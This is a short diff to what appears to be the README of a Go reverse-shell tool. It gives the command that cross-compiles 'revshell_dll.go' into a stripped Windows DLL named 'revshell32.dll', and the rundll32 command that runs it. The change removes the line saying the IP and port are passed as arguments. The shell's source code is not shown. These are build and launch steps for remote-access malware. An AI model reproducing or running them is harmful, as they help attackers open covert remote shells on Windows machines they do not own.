@@ -57,6 +57,6 @@ Cross compile on Linux for Windows:
 
 <code>env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell32.dll revshell_dll.go</code>
 
-To run, provide the IP address and port as command line arguments:
+To run:
 
 <code>rundll32.exe C:\revshell32.dll,Entry</code>
